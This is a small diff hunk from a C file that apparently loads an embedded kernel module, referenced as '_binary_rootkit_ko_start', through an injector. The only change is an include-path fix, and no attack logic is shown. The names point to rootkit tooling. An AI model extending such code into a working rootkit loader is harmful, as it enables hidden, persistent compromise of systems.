@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <syscall.h>
 #include <unistd.h>
-#include "common.h"
+#include "../common.h"
 #include "injector.h"
 
 extern const char _binary_rootkit_ko_start[];
